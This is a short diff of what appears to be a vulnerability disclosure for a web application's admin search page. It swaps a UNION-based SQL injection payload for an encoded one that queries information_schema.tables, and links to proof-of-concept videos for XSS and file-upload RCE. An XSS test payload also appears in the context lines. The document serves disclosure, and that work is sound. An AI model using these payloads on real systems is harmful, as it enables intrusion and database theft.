@@ -26,13 +26,17 @@ payload -> <script>alert(1)</script>
 
 + SQL injection
 
-payload -> ' UNION SELECT NULL,NULL,NULL--
+payload -> <@hex_entities>9999&#x53;ELECT * FROM information_schema.tables<@/hex_entities>
 
 + http://localhost/osghs/admin/search.php
 
 + POC
   
 https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/667cad95-bf9d-4636-9d7b-2145e1a68963
+
+https://github.com/Trinity-SYT-SECURITY/XSS_vuln_issue/assets/96654161/deb3e42b-3a88-4270-b0ee-10c2a70ff1be
+
+
 
 + File Upload Vulnerability
 
